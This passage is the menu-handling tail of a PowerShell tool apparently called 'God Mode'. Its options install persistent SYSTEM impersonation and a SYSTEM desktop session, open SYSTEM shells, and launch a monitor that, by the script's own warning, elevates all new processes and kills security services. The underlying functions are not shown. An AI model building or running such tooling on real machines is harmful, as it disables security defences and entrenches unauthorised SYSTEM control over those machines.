                    Enable-SystemImpersonation
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "16" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can install persistent SYSTEM impersonation.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                if (Test-PersistentSystemImpersonation) {
                    Uninstall-PersistentSystemImpersonation
                } else {
                    Install-PersistentSystemImpersonation
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "17" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can install SYSTEM desktop session.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                if (Test-SystemDesktopSession) {
                    Uninstall-SystemDesktopSession
                } else {
                    Install-SystemDesktopSession
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "10" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can launch the God Mode Monitor.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "`n[WARNING] Launching God Mode Monitor will start a persistent loop that elevates" -ForegroundColor Yellow
                Write-Host "          all new processes and kills security services. This is IRREVERSIBLE" -ForegroundColor Yellow
                Write-Host "          without closing the PowerShell process or rebooting." -ForegroundColor Yellow
                $confirm = Read-Host "Type 'YES' to launch the monitor"
                if ($confirm -eq 'YES') {
                    Start-Monitoring
                } else {
                    Write-Host "Launch cancelled." -ForegroundColor Green
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "18" {
            Reset-GmProxyAutoExcludeStore
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "19" {
            if (-not (Test-BuiltInAdmin)) {
                $sidInfo = Get-CurrentUserSidInfo
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator (SID ending in -500) can launch a SYSTEM shell.`n" -ForegroundColor Red
                Write-Host "Your SID: $($sidInfo.SID) | IsAdmin: $($sidInfo.IsAdmin) | IsBuiltInAdmin: $($sidInfo.IsBuiltInAdmin)" -ForegroundColor Yellow
            } else {
                Write-Host "`nLaunch an interactive shell as NT AUTHORITY\SYSTEM (whoami -> nt authority\system)." -ForegroundColor Cyan
                Write-Host "  1) cmd" -ForegroundColor Gray
                Write-Host "  2) powershell (default)" -ForegroundColor Gray
                Write-Host "  3) pwsh (PowerShell 7)" -ForegroundColor Gray
                Write-Host "  4) powershell_ise" -ForegroundColor Gray
                $shellChoice = Read-Host "Select shell (1-4, default 2)"
                $shellName = switch ($shellChoice) { "1" {"cmd"} "3" {"pwsh"} "4" {"ise"} default {"powershell"} }
                $null = Start-SystemShell -ShellName $shellName
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "11" { Export-GodModeLogs; Start-Sleep -Seconds 2 }
        "12" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
        default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
    }
} while ($Choice -ne "12")
